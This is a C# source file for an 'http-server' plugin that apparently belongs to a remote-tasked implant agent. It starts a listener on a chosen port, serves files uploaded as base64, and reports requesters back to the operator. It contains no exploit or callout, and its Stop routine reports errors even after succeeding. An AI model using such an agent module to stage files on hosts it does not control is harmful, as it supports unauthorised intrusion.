using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using http_server;
using System.Net;
using Agent.Utilities;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "http-server";
        private IMessageManager messageManager { get; set; }
        private Dictionary<string, byte[]> availableFiles;
        private string start_task = String.Empty;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            HttpServerArgs args = JsonSerializer.Deserialize<HttpServerArgs>(job.task.parameters);
            if(!args.Validate()){
                await messageManager.WriteLine("Failed to validated params", job.task.id, true);
                return;
            }


            switch (args.action.ToLower())
            {
                case "start":
                    await Start(args.port, job.cancellationtokensource, job.task.id, false);
                    break;
                case "add":
                    await AddFile(args.fileName, args.fileContents, job.task.id);
                    break;
                case "stop":
                    await Stop(job.task.id);
                    break;
                default:
                    break;
            }
        }
        private async Task Start(int port, CancellationTokenSource cts, string task_id, bool ssl)
        {
            availableFiles = new Dictionary<string, byte[]>();
            using (HttpListener listener = new HttpListener())
            {
                listener.Prefixes.Add($"http://*:{port}/");
                if (ssl)
                {
                    listener.Prefixes.Add($"https://*:{port}/");
                }
                listener.Start();
                this.start_task = task_id;
                await messageManager.WriteLine("Started on port " + port, task_id, false);

                while (!cts.IsCancellationRequested)
                {
                    try
                    {
                        HttpListenerContext context = await listener.GetContextAsync();
                        _ = HandleRequestAsync(context);
                    }
                    catch (Exception ex)
                    {
                        await messageManager.Write(ex.ToString(), task_id, false, "error");
                    }
                }
            }
            await messageManager.WriteLine("Server exit.", task_id, true);
            start_task = String.Empty;
        }
        private async Task HandleRequestAsync(HttpListenerContext context)
        {
            await messageManager.WriteLine($"[{DateTime.Now}] Request for {context.Request.Url} from {context.Request.RemoteEndPoint}", start_task, false);
            string requestUrl = context.Request.Url.LocalPath.TrimStart('/');

            if (availableFiles.ContainsKey(requestUrl))
            {
                byte[] fileContent = availableFiles[requestUrl];

                context.Response.StatusCode = (int)HttpStatusCode.OK;
                context.Response.ContentType = "application/octet-stream";
                context.Response.ContentLength64 = fileContent.Length;

                await context.Response.OutputStream.WriteAsync(fileContent, 0, fileContent.Length);
            }
            else
            {
                context.Response.StatusCode = (int)HttpStatusCode.NotFound;
            }

            context.Response.Close();
        }
        private async Task AddFile(string fileName, string fileContents, string task_id)
        {
            byte[] fileContent = Misc.Base64DecodeToByteArray(fileContents);
            availableFiles.Add(fileName, fileContent);
            await messageManager.Write($"{fileName} available at /{fileName}", task_id, false);
        }
        private async Task Stop(string task_id)
        {
            if (!String.IsNullOrEmpty(start_task))
            {
                ServerJob job;
                
                if(messageManager.TryGetJob(start_task, out job))
                {
                    job.cancellationtokensource.Cancel();
                    messageManager.WriteLine("Server tasked to exit.", task_id, true);
                }
                messageManager.WriteLine("Couldn't find job.", task_id, true, "error");
            }

            messageManager.WriteLine("No task_id specified, is the server running?", task_id, true, "error");
        }
    }
}